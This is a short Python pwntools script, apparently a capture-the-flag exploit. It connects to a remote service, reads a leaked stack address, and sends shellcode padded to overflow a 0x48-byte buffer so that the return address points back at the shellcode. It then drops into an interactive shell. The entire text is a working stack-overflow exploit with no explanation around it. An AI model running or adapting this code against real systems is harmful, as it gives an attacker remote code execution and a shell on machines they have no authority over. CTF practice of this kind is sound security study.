from pwn import *
#r=process('./pwn')
r=remote('106.75.95.47',42264)
r.recvuntil('gift->')
stack=int(r.recvuntil('\n'),16)
log.success('buf_addr:'+str(hex(stack)))
r.send(asm(shellcraft.sh())+(0x48+4-len(asm(shellcraft.sh())))*'a'+p32(stack))
r.interactive()
